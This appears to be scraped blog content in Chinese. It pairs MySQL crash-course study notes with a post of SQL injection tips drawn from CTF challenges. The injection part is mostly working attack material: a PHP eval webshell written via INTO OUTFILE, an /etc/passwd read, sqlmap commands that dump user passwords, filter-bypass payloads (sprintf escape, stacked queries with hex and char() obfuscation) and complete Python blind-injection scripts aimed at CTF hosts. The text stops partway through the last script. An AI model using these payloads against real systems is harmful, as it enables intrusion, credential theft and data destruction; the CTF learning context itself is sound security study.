第9章 用正则表达式进行搜索LIKE和REGEXP之间的一个重要差别 mysql&gt; select prod_name from products where prod_name like &apos;1000&apos; order by prod_name;Empty set (0.04 sec)mysql&gt; select prod_name from products where prod_name regexp &apos;1000&apos; order by prod_name;+--------------+| prod_name |+--------------+| JetPack 1000 |+--------------+1 row in set (0.00 sec)#如上执行上面的两条语句，第一个不返回数据，而第二条返回一行。原因如下：#LIKE是全匹配，如果被匹配的文本只是列值的一部分，LIKE将不会找到它，相应的行也不会被返回。#而REGEXP在列值内进行匹配，如果匹配的文本在列值中出现，REGEXP将会找到它，相应的行降被返回。这是一个重要的差别。 第10章 创建计算字段可能单纯为了好看吧，逃（ select Concat(vend_name,&apos;(&apos;,vend_country,&apos;)&apos;) from vendersorder by vend_name; 第11章 使用数据处理函数主要是文本处理函数对日期格式的管理，数值处理函数，我觉得可以具体用时针对性查一下 常用的文本处理函数Left() 返回串左边的字符Length() 返回串的长度Locate() 找出串的一个子串Lower() 将串转换为小写LTrim() 去掉串左边的空格Right() 返回串右边的字符RTrim() 去掉串右边的空格Soundex() 返回串的SOUNDEX值SubString() 返回子串的字符Upper() 将串转换为大写 Abs() 返回一个数的绝对值Cos() 返回一个角度的余弦Exp() 返回一个数的指数值Mod() 返回除操作的余数Pi() 返回圆周率Rand() 返回一个随机数Sin() 返回一个角度的正弦Sqrt() 返回一个数的平方根Tan() 返回一个角度的正切 第12章 汇总数据这5个聚集函数，AVG()，COUNT()，MAX()，MIN()，SUM() 第13章 分组数据(group by)HAVING和WHERE的差别WHERE在数据分组前进行过滤，HAVING在数据分组后进行过滤。 第14章 使用子查询要求MySQL4.1以上的版本,一般采用另外一个select的返回值当做当前select IN里面的参数 select cust_id from orders where order_num IN(select order_num from orderitems where prod_id=2); 第15章 联结表简单地说，联结是一种机制，用来在一条SELECT语句中关联表，因此称之为联结。使用特殊的语法，可以联结多个表返回一组输出，联结在运行时关联表中正确的行。 创建联结SELECT vend_name, prod_name, prod_price FROM vendors, productsWHERE vendors.vend_id = products.vend_id; 完全限定列名 在引用的列可能出现二义性时，必须使用完全限定列名（用一个点分隔的表名和列名）。如果引用一个没有用表名限制的具有二义性的列名，MySQL将返回错误。笛卡尔积(是不是很熟悉)由于没有联结条件的表关系返回的结果为笛卡尔积。检索出的行的数目将是第一个表中的行数*第二个表中的行数。 SELECT  vend_name,prod_name,prod_price FROM vendors,products ORDER BY vend_name,prod_name; 第16章 创建高级联结(有点复杂，故不全部细讲)16.1 使用表别名16.2 使用不同类型的联结16.2.1 自联结16.2.2 自然联结16.2.3 外部联结16.3 使用带聚集函数的联结16.4 使用联结和联结条件16.5 小结内部联结目前为止所用的联结称为等值联结。它基于两个表之间的相等测试。这种联结也称为内部联结。事实上，对于这种联结可以使用稍微不同的语法来明确指定联结的类型。 SELECT vend_name,prod_name,prod_price FROM vendors INNER JOIN products ON vendors.vend_id=products_vend_id; 联结多个表 SQL对一条SELECT语句中可以联结的表的数目没有限制。创建联结的基本规则也相同。 SELECT prod_name,vend_name,prod_price,quantity FROM orderitems,products,vendors WHERE products.vend_id=vendors.vend_idAND orderitems.prod_id=products.prod_idAND order_num=&apos;20005&apos; 性能考虑：MYSQL在运行时关联指定的每个表以处理联结，这种处理可能非常耗费资源的。有时候可以通过不同的方式来调优。 比如返回订购产品TNT2的客户列表。 SELECT cust_name,cust_contact FROM customers WHERE cust_id IN (SELECT cust_id FROM orders WHERE order_num IN(SELECT order_num FROM orderitems WHERE prod_id=&apos;TNT2&apos;)); 其实上面的句子并不是最有效的 SELECT cust_name,cust_contact FROM customers,orders,orderitems WHERE customers.cust_id=orders.cust_id AND orderitems.order_num=orders.order_num AND prod_id=&apos;TNT12&apos; 自联结比如知道ID 为DTNTR的物品存在问题，因此想知道生产该物品的供应商生产的其他物品是否也存在这种问题 SELECT prod_id ,prod_name FROM products WHERE vend_id=(SELECT vend_id FROM products WHERE prod_id=&apos;DTNTR&apos;); 其等价于下面的语句 SELECT p1.prod_id,p1.prod_name FROM products AS p1products AS p2 WHERE p1.vend_id =p2.vend.id AND p2.prod_id=&apos;DNTR&apos;; 第17章 组合查询组合查询适用于下面两种情境中：1、从多个表中查询出相似结构的数据，并且返回一个结果集2、从单个表中多次SELECT查询，将结果合并成一个结果集返回。 Union有他的强大之处，详细介绍之前，首先明确一下Union的使用注意规则。1、Union必须由两条或者两条以上的SELECT语句组成，语句之间使用Union链接。2、Union中的每个查询必须包含相同的列、表达式或者聚合函数，他们出现的顺序可以不一致（这里指查询字段相同，表不一定一样）3、列的数据类型必须兼容，兼容的含义是必须是数据库可以隐含的转换他们的类型 我们可以使用Union All操作符来取消自动合并功能 select user_id,user_nickname,user_status from yy_user where user_status = 1 UNION ALLselect user_id,user_nickname,user_status from yy_user where user_id &gt; 3 结果排序 (select user_id,user_nickname,user_status from yy_user where user_status = 1) UNION ALL(select user_id,user_nickname,user_status from yy_user where user_id &gt; 3)order by user_id desc 第18章 全文本搜索MySQL支持几种基本的数据库引擎，但并非所有的引擎都支持全文本搜索。两个最常使用的引擎为MyISAM和InnoDB，前者支持全文本搜索，后者就不支持。当我们想利用全文本搜索得到 包含MySQL内容的数据。如下： select * from test_text where match(content) against(&apos;MySQL&apos;); 上面语句中 match(content) 指示MySQL针对指定的列进行搜索，注意：传递给match()的值必须与fulltext()定义中的相同。against(‘MySQL’)指定词MySQL作为搜索文本。 第19章 插入数据1、正因为没有字段名，则values中值得顺序必须与字段在表中顺序一致。基本语法： INSERT INTO 表名 VALUES(值1，值2，....); 2、为表的指定字段添加数据基本语法： INSERT INTO 表名（字段1，字段2，...） VALUES (值1，值2，...); 第20章 更新和删除数据UPDATE 语句基本语法： UPDATE 表名 SET 字段名1=值1[,字段名2=值2，...] [WHERE 条件表达式] 删除数据即，对表中存在的记录进行删除。基本语法： DELETE FROM 表名 [ WHERE 条件表达式 ] ; 删除指定列基本语法： alter table tablename drop columnname; 第21章 创建和操纵表为了利用CREATE TABLE创建表，必须给出下列信息：1 新表的名字，在关键字CREATE TABLE之后给出2 表列的名字和定义，用逗号分隔 CREATE TABLE table(column_id int NOT NULL AUTO_INCRMENT,columnOne char(20) NOT NULL DEFAULT 1,columnOne char(20) NOT NULL ,column char(20) NOT NULL ,.....PRIMARY KEY ( column_id)) ENGINE = InnoDB 如果表已经存在，则必须先删除后在创建他，不可以直接覆盖。如果仅想在表没有存在的情况下创建它，应该在表名后给出 IF NOT EXISTS使用NULL值 如果不指定列为NOT NULL则它默认是NULL主键再介绍 主键的值必须是唯一的。创建主键时可以用单列做主键PRIMARY KEY(columnOne,columnTwo)，也可以使用多列做主键PRIMARY KEY(columnOne,columnTwo).主键值不允许为NULL引擎搜索1 InnoDB是一个可靠的事务处理引擎，它不支持全文本搜索。2 MEMORY 在功能上等同于MySAM，但由于数据存储在内存，所以速度更快（特别适用于临时表）3 MySAM是一个性能极高的引擎，它支持全文本搜索，但不支持事务处理 第22章 使用视图视图中不存放任何数据，在使用SQL语句访问视图的时候，返回的数据时MySQL从其他表中生成的。视图和表在同一个命名空间，在很多地方对于视图和表是同样对待的。不过也有不同，不能对视图创建触发器，不能使用DROP TABLE命令删除视图。[1] 创建一个视图： create view Oceania asselect * from Country where Continent =&apos;Oceania&apos;with check option; [2] 删除视图 drop view view_name; [3] 使用视图 select * from view_name; 第23章 使用存储过程(类似于函数)存储过程，是为了完成一个复杂任务，而编写的多条sql语句的集合，语句执行次序不定，需要根据检索条件判断。存储过程实际上是一种函数，因此存储过程名后要加括号（），来放置参数，即使没有参数也要括号。创建存储过程返回产品的平均价格： delimiter //create procedure product_avgprice()  #括号来放置参数，即使没有参数也要括号。beginselect avg(prod_price) as avg_price  from products;end// ; 自定义分隔符：DELIMITER // 自定义定界符、分隔符，除了\\，都可以作为分隔符。自定义分隔符作用：替换系统分隔符-分号（;），防止系统报错。因为系统分不清（;）是存储过程结尾，还是sql语句结尾。执行存储过程例：查询产品平均价：call product_avgprice(); #括号来放置参数，即使没有参数也要括号。存储过程例：删除product_avgprice2存储过程：drop procedure if exists product_avgprice2; #注意这里过程名称后不带括号 第24章 使用游标在检索出来的行中，前进或者后退一行或多行，就需要用到所谓的“游标”。游标不是某个SELECT语句，但是它是被该语句检索出来的结果集，另外，MySQL游标只能用于存储过程（和函数）。创建游标使用DECLARE和CURSOR关键字： CREATE PROCEDURE processorders()BEGIN DECLARE ordernumbers CURSOR FOR SELECT order_num FROM orders;END; 打开和关闭游标因为游标局限于存储过程，所以如果存储过程处理完成后，游标就会消失。所以往往在存储过程中要关键字OPEN进行打开。另，游标相关的SELECT查询语句，在定义时是不执行的，在OPEN时才执行查询，存储检索出的数据以供浏览和滚动。在游标使用完成后，使用CLOSE进行关闭： 第25章 触发器的使用触发器是MySQL响应DELETE,INSERT,UPDATE而自动执行的一条MySQL语句,其他语句不支持触发器。 　　创建触发器时，需要4个条件；　　　　唯一的触发器名　　　　触发器关联的表　　　　触发器应该响应的活动　　　　触发器何时执行 　　MySQL中触发器名在每个表中必须唯一，但是在同一个数据库中的两个表可具有相同名字的触发器。这个条件在其他的DBMS中是不允许的，所以为了统一，最好在同一个数据库中，触发器名设置成唯一的。 创建触发器 CREATE TRIGGER newproduct AFTER INSERT ON productsFOR EACH ROW SELECT &apos;Product added&apos;;CREATE TRIGGER--创建一个叫newproduct的新触发器AFTER INSERT--此触发器将在INSERT语句成功后执行FOR EACH ROW--代码对每个插入行执行 删除触发器 DROP TRIGGER newproduct; 使用触发器　　INSERT触发器　　　　可以引用一个叫NEW的虚拟表，来访问插入的行　　DELETE触发器　　　　引用一个叫OLD的虚拟表，来访问被删除的行　　UPDATE触发器　　　　书中缺页未介绍 第26章 管理事务处理MySQL中有好几种引擎，但是不是每种引擎都支持事务处理　　常用的引擎中InnoDB支持事务，MyISAM不支持事务　　几个名词:　　　　事务transaction　　　　回退rollback　　　　提交commit　　　　保留点savepoint控制事务管理 ROLLBACKSELECT * FROM ordertotals;START TRANSACTION;DELETE FROM ordertotals;SELECT * FROM ordertotals;ROLLBACK;SELECT * FROM ordertotals; 注意：事务用来管理INSERT、UPDATE和DELETE。不能回退CREATE或者DROP操作更改默认的提交行为 SET autocommit=0 注意：autocommit标志是针对每个连接，而不是服务器； 第27章 国际化与本地化字符集和校对顺序字符集：字母和符号的集合编码：某个字符集成员的内部表示校对：规定字符如何比较的指令使用字符集和校对顺序show character set; – 显示所有可用的字符集以及描述和默认校对SHOW COLLATION; – 显示所有可用的校对以及它们适用的字符集 SHOW VARIABLES LIKE ‘character%’;SHOW VARIABLES LIKE ‘collation%’; – 为了确定所用的字符集和校对 CREATE TABLE mytable( column1 INT, column2 VARCHAR(10)) DEFAULT CHARACTER SET hebrew COLLATE hebrew_general_ci;CREATE TABLE mytable( columnn1 INT, columnn2 VARCHAR(10), column3 VARCHAR(10) CHARACTER SET latin1 COLLATE latin1_general_ci ) DEFAULT CHARACTER SET hebrew COLLATE hebrew_general_ci; SELECT * FROM customersORDER BY lastname, firstname COLLATE latin1_general_cs; 第28章 安全管理1.访问控制管理访问控制需要创建和管理用户账号有的用于管理，有的供用户使用，有的供开发人员使用；建议不要使用root；2.管理用户 -- 获得用户列表SELECT user FROM user;-- 创建用户账号，ben是用户名，BY后面是口令；CREATE USER ben IDENTIFIED BY &apos;p@$$w0rd&apos;;-- 删除用户账号DROP USER bforta;-- 设置访问权限SHOW GRATNS FOR bforta; -- 显示权限GRANT SELECT ON crashcourse.* TO bforta;　--　添加SELECT权限REVOKE SELECT ON crashcourse.* FROM bforta; --　删除SELECT权限-- 设置口令(不指定用户，则默认更新当前用户口令) 第29章 数据库维护1.备份数据使用命令行实用程序mysqldump转储所有数据库内容到某个外部文件；可用命令行实用程序mysqlhotcopy从一个数据库复制所有数据；可以使用MySQL的BACKUP TABLE或SELECT INTO OUTFILE转储所有数据到某个外部文件；2.进行数据库维护 -- 用来检查表键是否正确；ANALYZE TABLE orders;-- 用来针对许多问题对表进行检查；CHECK TABLE orders,orderitems; 3.查看日志文件错误日志；查询日志；二进制日志；缓慢查询日志； 第30章 改善性能一大堆优化性能的建议 四、操作符优先级优先级 运算符(最高) ! -（负号）,~（按位取反） ^（按位异或） *,/(DIV),%(MOD) +,- &gt;&gt;,&lt;&lt; &amp; | =(比较运算),&lt;=&gt;,&lt;,&lt;=,&gt;,&gt;=,!=,&lt;&gt;,IN,IS NULL,LIKE,REGEXP BETWEEN AND,CASE,WHEN,THEN,ELSE NOT &amp;&amp;,AND XOR ||,OR(最低) =(赋值运算),:= 你是妖怪吧！！！有耐心看到这Orz 熟能生巧，天道酬勤，一起加油","link":"2019/01/23/mysql%E5%BF%85%E7%9F%A5%E5%BF%85%E4%BC%9A/"},{"title":"sql注入的一些tip","text":"一:基础语句show databases; //查看数据库use xxx; //使用某个数据库show tables; //查看该数据库的数据表desc xxx; //查看该数据表的结构select * from xxx; //查找某个数据表的所有内容select schema_name from information_schema.schemata; //猜数据库select table_name from information_schema.tables where table_schema=&apos;xxxxx&apos;; //猜某数据库的数据表Select column_name from information_schema.columns where table_name=&apos;xxxxx&apos;; //猜某表的所有列left(a,b) //从左侧截取 a 的前 b 位mid(column_name,start[,length]) //从位置start开始，截取column_name字符串的length位，与substr作用相同substr(string, start, length) //从位置start开始，截取字符串string的length长度，与mid作用相同ascii() //将某个字符转换成ascii码ord() //将某个字符转换成ascii码，同ascii()select database() //当前数据库concat() //能将一些字符串连接一个字符串适用于一条数据group_concat() //能够将一张表的数据的一些数据分组合并起来，适用性比较广select @@basedir; //显示文件根目录show variables like &quot;%char%&quot;;show global variables like &apos;%secure_file_priv%&apos;;select load_file(&apos;/ect/passwd&apos;); //读文件 需要开secure-file-priv=&apos;/&apos;select &apos;&lt;?php @eval($_post[&quot;mima&quot;])?&gt;&apos; into outfile &quot;位置&quot; //写文件user(); //当前用户 二、sqlmap使用github地址为https://github.com/sqlmapproject/sqlmap，功能参考书https://github.com/Kit4y/Sql-Injection/blob/master/Book/sqlmap教程.pdf 一些常用使用命令1、是否能注入python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; 2、获取所有的数据库python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; --dbs 3、当前库python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; --current-db 4、查询某数据库的所有表（比如security）python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; -D security --tables 5、暴力查询所有的表python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; --tables 6、列出security库中users表中的所有列python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; -D security -T users --columns (-D dbname指定数据库名称、-T tablename：指定某数据表的名称、–columns：列出指定表上的所有列) 7、导出三个数据列中所有的数据python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; -D security -T users -C id,username,password --dump 8、提供一个sql shellpython sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; --sql-shell 9、postpython sqlmap.py -u 登录的地址 --data &quot;userid=aaa&amp;passwd=bbbb&quot; 10、添加前缀--prefix=&quot;%1$\\&apos;&quot; -p username --cookie=&quot;PHPSESSID=cf49a9a60da9cc1b547ab98d549ba038&quot; sqlmap -u &quot;http://web59.buuoj.cn/admin.php?id=4&quot; --cookie=&quot;PHPSESSID=cf49a9a60da9cc1b547ab98d549ba038&quot; -T flag --dump --flush-session --fresh-queries --fresh-queries --delay 0.1 sqlilabs搭建docker pull acgpiano/sqli-labsdocker run -dt --name sqli-lab -p [你要映射的端口]:80 acgpiano/sqli-labs:latest 三、注释问题3.1、MySql–三种注释写法3.1.1、--后面一定要加空格 3.1.2、#3.1.3、/**/3.2、注入尾部为什么是--+而不是--这里字符-和字符+在URL中都是有固定的含义的 , 比如说+就在URL编码中就代表空格 , 而URL编码中-不用编码。我们也可以不用+ 而使用空格的URL编码 , 那么编码得到的URL就应该是 : id=1%27--%20 3.3、#又为什么必须得编码 , 不编码可以吗 ?不可以 , 因为# 在URL中是有固定的含义的 , 表示页面中的锚点 , 如果不进行编码浏览器就会将其当成页面的锚点 , 而这里我们是需要将其作为数据传输给服务器的 , 因此需要进行URL编码 四、补充mysql的一些函数4.1、substr()substr()函数是用来截取数据库某一列字段中的一部分常用的方式是： SBUSTR(str,pos); 就是从pos开始的位置，一直截取到最后。 SUBSTR(str,pos,len); 这种表示的意思是，就是从pos开始的位置，截取len个字符(空白也算字符)。需要注意的是：如果pos为1(而不是0)，表示从第一个位置开始。这点也很好理解，因为数据库不是我们平时写程序，他有他自己的一套习惯，数据库的记录都是从1开始没有从0开始 4.2、ascii(),ord()函数ASCII(str1)返回字符串str的最左面字符的ASCII代码值。如果str是空字符串，返回0。如果str是NULL，返回NULL mysql&gt; select ascii(&quot;a&quot;);+------------+| ascii(&quot;a&quot;) |+------------+| 97 |+------------+1 row in set (0.00 sec) ORD() 函数ORD() 函数返回字符串第一个字符的ASCII 值。 mysql&gt; select ord(&quot;a&quot;);+----------+| ord(&quot;a&quot;) |+----------+| 97 |+----------+1 row in set (0.00 sec) 4.3、LEFT()函数是一个字符串函数，它返回具有指定长度的字符串的左边部分。LEFT(str,length); LEFT()函数接受两个参数：str是要提取子字符串的字符串。length是一个正整数，指定将从左边返回的字符数。 mysql&gt; select left(&quot;hello Kitty&quot;,5);+-----------------------+| left(&quot;hello Kitty&quot;,5) |+-----------------------+| hello |+-----------------------+1 row in set (0.00 sec) 与之类似的是right(str,length); mysql&gt; select right(&quot;hello Kitty&quot;,5);+------------------------+| right(&quot;hello Kitty&quot;,5) |+------------------------+| Kitty |+------------------------+1 row in set (0.00 sec) 4.4、REGEXP可以在不使用数据库表的情况下用 SELECT 语句来测试正则表达式，REGEXP 检查总是返回0（没有匹配）或1（匹配）。可以用带文字串的 REGEXP 来测试表达式，并试验它们。 mysql&gt; SELECT &apos;kitty&apos; REGEXP &apos;[0-9a-z]{6}&apos;;+------------------------------+| &apos;kitty&apos; REGEXP &apos;[0-9a-z]{6}&apos; |+------------------------------+| 0 |+------------------------------+1 row in set (0.00 sec) mysql&gt; SELECT &apos;kitty&apos; REGEXP &apos;[0-9a-z]{5}&apos;;+------------------------------+| &apos;kitty&apos; REGEXP &apos;[0-9a-z]{5}&apos; |+------------------------------+| 1 |+------------------------------+1 row in set (0.00 sec) 4.5、MID()SELECT MID(column_name,start[,length]) FROM table_name; 函数用于从文本字段中提取字符。 +----+--------------+---------------------------+-------+---------+| id | name | url | alexa | country |+----+--------------+---------------------------+-------+---------+| 1 | Google | https://www.google.cm/ | 1 | USA || 2 | 淘宝 | https://www.taobao.com/ | 13 | CN || 3 | 菜鸟教程 | http://www.runoob.com/ | 4689 | CN || 4 | 微博 | http://weibo.com/ | 20 | CN || 5 | Facebook | https://www.facebook.com/ | 3 | USA || 7 | stackoverflow | http://stackoverflow.com/ | 0 | IND |+----+---------------+---------------------------+-------+---------+ SELECT MID(name,1,4) AS ShortTitleFROM Websites; 返回结果 4.6、if() 在mysql中if()函数的用法类似于java中的三目表达式，其用处也比较多，具体语法如下： IF(expr1,expr2,expr3)，如果expr1的值为true，则返回expr2的值，如果expr1的值为false， mysql&gt; select name,if(sex=0,&apos;女&apos;,&apos;男&apos;) as sex from student;+-------+-----+| name | sex |+-------+-----+| name1 | 女 || name2 | 女 || name3 | 男 || name4 | 女 |+-------+-----+rows in set (0.00 sec) 五、sprintf格式化字符串带来的注入隐患语句 &lt;?php$input = addslashes(&quot;%1$&apos; and 1=1#&quot;);$b = sprintf(&quot;AND b=&apos;%s&apos;&quot;, $input);...$sql = sprintf(&quot;SELECT * FROM t WHERE a=&apos;%s&apos; $b&quot;, &apos;admin&apos;);echo $sql; 通过fuzz得知，在php的格式化字符串中，%后的一个字符(除了’%’)会被当作字符类型，而被吃掉，单引号’，斜杠\\也不例外。 如果能提前将%’ and 1=1#拼接入sql语句，若存在SQLi过滤，单引号会被转义成&apos; select * from user where username = &apos;%\\&apos; and 1=1#&apos;; 然后这句sql语句如果继续进入格式化字符串，\\会被%吃掉，’成功逃逸 &lt;?php$sql = &quot;select * from user where username = &apos;%\\&apos; and 1=1#&apos;;&quot;;$args = &quot;admin&quot;;echo sprintf( $sql, $args ) ;//result: select * from user where username = &apos;&apos; and 1=1#&apos;?&gt; 还可以使用%1$吃掉后面的斜杠，而不引起报错 &lt;?php$sql = &quot;select * from user where username = &apos;%1$\\&apos; and 1=1#&apos; and password=&apos;%s&apos;;&quot;;$args = &quot;admin&quot;;echo sprintf( $sql, $args) ;//result: select * from user where username = &apos;&apos; and 1=1#&apos; and password=&apos;admin&apos;;?&gt; 具体题目为下方的迎圣诞，拿大奖”活动赛题sqli 六、题目经典payload-1&apos; union select 1,2,group_concat(schema_name) from information_schema.schemata%23-1&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema= &apos;security&apos;%23-1&apos; union select 1,2,group_concat(column_name) from information_schema.columns where table_name= &apos;users&apos;%23-1&apos; union select 1,group_concat(username),group_concat(password) from users%23 “百度杯”CTF比赛 九月场SQLi-过滤了逗号id=1&apos; union select * from (select database()) a join (select version() ) b %23 过滤了空格，逗号，等号，for，and等的盲注，使用^mid函数骚操作空格用括号代替，等号用&lt;&gt;(一种不等号)代替异或运算^代替and import requestsstr_all=&quot;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ {}+-*/=&quot;url=&quot;http://123.206.31.85:49167/index.php&quot;r=requests.session()def database(): result=&quot;&quot; for i in range(30): flag = 0 for j in str_all: payload=&quot;admin&apos;^(ascii(mid(database()from({})))&lt;&gt;{})^0#&quot;.format(str(i+1),ord(j)) data = { &quot;username&quot;: payload, &quot;password&quot;: &quot;123&quot; } s=r.post(url,data) print(payload) if &quot;error&quot; in s.text: result+=j flag=1 print(&apos;**************************&apos;,result) break if flag == 0: breakdef password(): result=&quot;&quot; for i in range(40): flag=0 for j in str_all: payload = &quot;admin&apos;^(ascii(mid((select(password)from(admin))from({})))&lt;&gt;{})^0#&quot;.format(str(i+1),ord(j)) data = { &quot;username&quot;: payload, &quot;password&quot;: &quot;123&quot; } s=r.post(url,data) print(payload) if &quot;error&quot; in s.text: result+=j flag=1 print(&apos;**************************&apos;,result) break if flag==0: break#database()password() mid()函数和substring()一样，一种写法是mid(xxx,1,1)，另一种是mid(xxx from 1 for 1)但是这里过滤了for和逗号，那么怎么办呢？这里用到了ascii()取ascii码值的函数，如果传入一个字符串那么就会取第一个字符的字符的ascii码值，这就有了for的作用，并且mid()函数是可以只写from的表示从第几位往后的字符串，我们将取出的字符串在传入ascii()中取第一位，就完成了对单个字符的提取。每个字符的ascii码判断是不是不等于给定的数字，会得到一个布尔值(0或1)再与结尾的0进行运算。如果数据库名的第一位的ascii码值不是97，where条件是username=&apos;admin&apos;^1^0 [强网杯 2019]随便注-堆叠注入条件苛刻 堆叠注入的使用条件十分有限，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。 1&apos;;show databases;#1&apos;;show tables; #0&apos;;show columns from `1919810931114514`;# (翻博客发现数字串为表名的表操作时要加反引号，加上之后发现的确有flag字段)理论上我们执行0&apos;;select flag,1 from 1919810931114514但是这题的select被过滤了return preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;,$inject);也可以-1&apos;;use supersqli;show tables;-- 直接获取flag1&apos;;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#其中73656c656374202a2066726f6d20603139313938313039333131313435313460加密为select * from `1919810931114514’相关知识 在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。 还有骚操作是改表段然后注入获得数据 0&apos;;set @s=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(102),char(108),char(97),char(103),char(32),char(102),char(114),char(111),char(109),char(32),char(96),char(49),char(57),char(49),char(57),char(56),char(49),char(48),char(57),char(51),char(49),char(49),char(49),char(52),char(53),char(49),char(52),char(96));PREPARE a FROM @s;EXECUTE a; “百度杯”CTF比赛 九月场 SQL题目描述：出题人就告诉你这是个注入，有种别走！http://2733aeef10c94e969b49b24dd9e8a99bbdd989b14f4e482e.changame.ichunqiu.com/index.php?id=1 union se&lt;&gt;lect 1,4,3，学到了学到了&lt;&gt;分离http://2733aeef10c94e969b49b24dd9e8a99bbdd989b14f4e482e.changame.ichunqiu.com/index.php?id=1 union se&lt;&gt;lect 1,database(),3获得数据库名字sqli然后一步一步http://2733aeef10c94e969b49b24dd9e8a99bbdd989b14f4e482e.changame.ichunqiu.com/index.php?id=1 union se&lt;&gt;lect 1,column_name,3 from information_schema.columns where table_schema=&apos;sqli&apos; an&lt;&gt;d table_name=&apos;info&apos;http://2733aeef10c94e969b49b24dd9e8a99bbdd989b14f4e482e.changame.ichunqiu.com/index.php?id=1 union se&lt;&gt;lect 1,flAg_T5ZNdrm,3 from info得到flag 盲注模板“迎圣诞，拿大奖”活动赛题sqli模板 #!/usr/bin/env python# encoding:utf8import requestsimport timeimport sys# config-startsleep_time = 5error_time = 1# config-enddef getPayload(indexOfResult, indexOfChar, mid): column_name=&quot;column_name&quot; table_name=&quot;columns&quot; database_name=&quot;information_schema&quot; startStr = &quot;admin%1$\\\\&apos; or &quot; endStr = &quot; #&quot; payload = &quot;((ascii(substring((select &quot; + column_name + &quot; from &quot; + database_name + &quot;.&quot; + table_name + &quot; where table_name=0x666c6167 limit &quot; + indexOfResult + &quot;,1 ),&quot; + indexOfChar + &quot;,1)))&gt;&quot; + mid + &quot;)&quot; payload = startStr + payload + endStr return payloaddef exce(indexOfResult,indexOfChar,mid): # content-start url = &quot;http://3ce3bb7f26364585b8d7970ae179fe54857ddd7277964f32.changame.ichunqiu.com/&quot; post_data={&quot;username&quot;:getPayload(indexOfResult,indexOfChar,mid),&quot;password&quot;:&quot;123&quot;} print(post_data) content = requests.post(url,data=post_data) content.encoding=&apos;utf-8&apos; content=content.text #print(content) # content-end # judge-start if &quot;password error!&quot; in content: return True else: return False # judge-enddef exceGet(indexOfResult,indexOfChar,mid): # content-start url = &quot;http://localhost/sqli-labs-master/Less-5/?id=&quot; tempurl = url + getPayload(indexOfResult,indexOfChar,mid) content = requests.get(tempurl).text # content-end # judge-start if &quot;You are in...........&quot; in content: return True else: return False # judge-enddef doubleSearch(indexOfResult,indexOfChar,left_number, right_number): while left_number &lt; right_number: mid = int((left_number + right_number) / 2) if exce(str(indexOfResult),str(indexOfChar + 1),str(mid)): left_number = mid else: right_number = mid if left_number == right_number - 1: if exce(str(indexOfResult),str(indexOfChar + 1),str(mid)): mid += 1 break else: break return chr(mid)def search(): for i in range(32): # 需要遍历的查询结果的数量 counter = 0 for j in range(32): # 结果的长度 counter += 1 temp = doubleSearch(i, j, 0, 127) # 从255开始查询 if ord(temp) == 1: # 当为1的时候说明已经查询结束 break sys.stdout.write(temp) sys.stdout.flush() if counter == 1: # 当结果集的所有行都被遍历后退出 break sys.stdout.write(&quot;\\r\\n&quot;) sys.stdout.flush()search() 获得库ctf def getPayload(indexOfResult, indexOfChar, mid): column_name=&quot;schema_name&quot; table_name=&quot;schemata&quot; database_name=&quot;information_schema&quot; startStr = &quot;admin%1$\\\\&apos; or &quot; endStr = &quot; #&quot; payload = &quot;((ascii(substring((select &quot; + column_name + &quot; from &quot; + database_name + &quot;.&quot; + table_name + &quot; limit &quot; + indexOfResult + &quot;,1),&quot; + indexOfChar + &quot;,1)))&gt;&quot; + mid + &quot;)&quot; payload = startStr + payload + endStr return payload 获得表名flag def getPayload(indexOfResult, indexOfChar, mid): column_name=&quot;table_name&quot; table_name=&quot;tables&quot; database_name=&quot;information_schema&quot; startStr = &quot;admin%1$\\\\&apos; or &quot; endStr = &quot; #&quot; payload = &quot;((ascii(substring((select &quot; + column_name + &quot; from &quot; + database_name + &quot;.&quot; + table_name + &quot; where table_schema=database() limit &quot; + indexOfResult + &quot;,1 ),&quot; + indexOfChar + &quot;,1)))&gt;&quot; + mid + &quot;)&quot; payload = startStr + payload + endStr return payload 获得字段flag def getPayload(indexOfResult, indexOfChar, mid): column_name=&quot;table_name&quot; table_name=&quot;tables&quot; database_name=&quot;information_schema&quot; startStr = &quot;admin%1$\\\\&apos; or &quot; endStr = &quot; #&quot; payload = &quot;((ascii(substring((select &quot; + column_name + &quot; from &quot; + database_name + &quot;.&quot; + table_name + &quot; where table_name = 0x666c6167 limit &quot; + indexOfResult + &quot;,1 ),&quot; + indexOfChar + &quot;,1)))&gt;&quot; + mid + &quot;)&quot; payload = startStr + payload + endStr return payload 获得数据 def getPayload(indexOfResult, indexOfChar, mid): column_name=&quot;flag&quot; table_name=&quot;columns&quot; database_name=&quot;flag&quot; startStr = &quot;admin%1$\\\\&apos; or &quot; endStr = &quot; #&quot; payload = &quot;((ascii(substring((select &quot; + column_name + &quot; from &quot; + database_name + &quot; limit &quot; + indexOfResult + &quot;,1 ),&quot; + 